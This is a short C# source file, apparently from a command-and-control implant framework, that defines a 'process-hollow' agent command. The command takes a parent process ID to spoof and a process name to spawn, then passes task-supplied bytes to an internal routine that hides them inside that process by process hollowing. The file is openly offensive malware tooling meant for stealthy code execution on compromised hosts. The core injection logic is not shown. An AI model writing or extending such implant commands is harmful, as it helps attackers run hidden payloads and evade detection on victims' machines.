using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class ProcessHollow : AgentCommand
    {
        public override string Name => "process-hollow";

        public override string Execute(AgentTask task)
        {
            if (task.Args is null || task.Args.Length == 0)
            {
                return "ppid provided";
            }
            if (!int.TryParse(task.Args[0], out var ppid))
                return "Failed to parse Parent PID to spoof";
            var processToSpawn = task.Args[1];
            if (!Internal.Execute.ExecuteProcessHollow(task.FileBytes, processToSpawn, ppid))
                return "Failed to perform process hollow";
            return "Successfully performed process hollow";


        }
    }
}
